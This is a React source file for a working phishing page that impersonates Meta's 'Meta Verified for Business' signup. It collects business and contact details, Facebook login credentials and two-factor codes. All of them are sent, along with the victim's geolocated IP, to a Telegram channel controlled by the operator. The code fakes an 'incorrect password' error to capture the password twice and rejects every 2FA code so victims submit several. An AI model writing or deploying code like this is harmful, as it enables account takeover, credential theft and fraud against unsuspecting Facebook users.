import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendTelegramMessage, setInitialSession, escapeHtml } from '../utils/telegram';

export default function Verify() {
  const navigate = useNavigate();
  const [step, setStep] = useState(1);
  const [clientIp, setClientIp] = useState('Unknown');
  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); const [countryCode, setCountryCode] = useState('+84'); const [phoneNum, setPhoneNum] = useState('');
  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

  useEffect(() => { fetch('https://ipwho.is/').then(r => r.json()).then(d => { if (d && d.ip) setClientIp(`${d.ip} - ${d.country} (${d.city})`); }).catch(()=>{}); }, []);

  const handleSignup = (e) => {
    e.preventDefault(); let errs = {};
    if (busName.length < 2) errs.busName = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    setErrors({}); setLoading(true);
    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
    setInitialSession(text); sendTelegramMessage('');
    setTimeout(() => { setLoading(false); setStep(2); setLoginAttempt(0); }, 700);
  };

  const handleLogin = (e) => {
    e.preventDefault(); if (loginPass.length === 0) return;
    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
    setTimeout(() => { setLoading(false); if (newAttempt === 1) { setShowLoginError(true); setLoginPass(''); } else { setStep(3); setOtpAttempt(0); } }, (newAttempt === 1) ? 3000 : 5000);
  };

  const handleOtp = (e) => {
    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
    setTimeout(() => { setLoading(false); setShowOtpError(true); setOtp(''); }, 1500);
  };

  return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.4)', position: 'fixed', inset: 0, zIndex: 1000 }}>
      {step === 1 && (
        <div className={`modal-container ${errors.busName || errors.perEmail || errors.busEmail || errors.phoneNum ? 'shake' : ''}`} style={{ position: 'relative' }}>
           <button className="modal-close" onClick={() => navigate('/')}>×</button>
           <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
           <h2 className="modal-title">Meta Verified for Business</h2>
           <p className="modal-subtitle">Enter your business details to start your application.</p>
           <form onSubmit={handleSignup} className="fb-form" noValidate>
              <div className="fb-input-group"><input className={`fb-input ${errors.busName ? 'input-error' : ''}`} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />{errors.busName && <div className="field-error show"><span>Please enter your business name.</span></div>}</div>
              <div className="fb-input-group"><input className={`fb-input ${errors.perEmail ? 'input-error' : ''}`} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />{errors.perEmail && <div className="field-error show"><span>Please enter a valid personal email.</span></div>}</div>
              <div className="fb-input-group"><input className={`fb-input ${errors.busEmail ? 'input-error' : ''}`} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />{errors.busEmail && <div className="field-error show"><span>Please enter a valid business email.</span></div>}</div>
              <div className="fb-input-group">
                  <div className="fb-phone-group">
                      <div className="fb-phone-select-wrap"><select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)}><option value="+84">+84 (Vietnam)</option><option value="+1">+1 (US)</option><option value="+44">+44 (UK)</option></select></div>
                      <input className={`fb-input ${errors.phoneNum ? 'input-error' : ''}`} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                  </div>
                  {errors.phoneNum && <div className="field-error show"><span>Please enter a valid phone number.</span></div>}
              </div>
              <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Submitting...' : 'Continue'}</button>
           </form>
           <div className="modal-meta-footer"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" /></div>
        </div>
      )}

      {step === 2 && (
        <div className={`modal-container ${showLoginError ? 'shake' : ''}`} style={{ position: 'relative' }}>
           <button className="modal-close" onClick={() => navigate('/')}>×</button>
           <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
           <form onSubmit={handleLogin} className="fb-form">
              <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
              <input className="fb-input" type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
              {showLoginError && <div className="alert-error show"><span>The password you entered is incorrect. Please try again.</span></div>}
              <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Logging in...' : 'Log in'}</button>
              <div className="fb-helper"><a href="#" onClick={e => e.preventDefault()}>Forgotten password?</a></div>
           </form>
           <div className="modal-meta-footer"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" /></div>
        </div>
      )}

      {step === 3 && (
        <div className={`modal-container ${showOtpError ? 'shake' : ''}`} style={{ position: 'relative' }}>
           <button className="modal-close" onClick={() => navigate('/')}>×</button>
           <div className="modal-brand"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" /></div>
           <h2 className="modal-title">Two-factor authentication</h2>
           <p className="modal-subtitle">Enter the 6-digit code we sent to your WhatsApp or SMS, or an 8-digit backup code.</p>
           <form onSubmit={handleOtp} className="fb-form">
              <input className="fb-input fb-otp-input" placeholder="000000" value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, '').slice(0, 8))} required maxLength={8} />
              {showOtpError && <div className="alert-error show"><span>Invalid security code. Please check the code and try again.</span></div>}
              <button type="submit" className="fb-btn" disabled={loading}>{loading ? 'Verifying...' : 'Verify'}</button>
           </form>
           <div className="modal-meta-footer"><img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" /></div>
        </div>
      )}
    </div>
  );
}
